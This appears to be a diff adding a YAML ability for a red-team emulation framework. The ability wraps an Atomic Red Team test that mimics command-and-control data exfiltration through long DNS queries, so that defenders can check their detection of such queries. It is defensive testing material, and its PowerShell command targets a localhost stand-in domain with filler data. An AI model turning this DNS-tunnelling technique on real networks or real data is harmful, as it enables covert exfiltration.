@@ -1,0 +1,24 @@
+---
+- id: ce2eccff2f1de0096efa0da778a7e27c
+  name: DNS Long Domain Query
+  description: "This test simulates an infected host returning data to a command and\
+    \ control server using long domain names.\nThe simulation involves sending DNS\
+    \ queries that gradually increase in length until reaching the maximum length.\
+    \ The intent is to test the effectiveness of detection of DNS queries for long\
+    \ domain names over a set threshold.\n Upon execution, DNS information about the\
+    \ domain will be displayed for each callout.\n"
+  tactic: command-and-control
+  technique:
+    attack_id: T1071.004
+    name: 'Application Layer Protocol: DNS'
+  platforms:
+    windows:
+      psh:
+        command: Set-Location "PathToAtomicsFolder"; .\T1071.004\src\T1071-dns-domain-length.ps1
+          -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+          -QueryType TXT
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
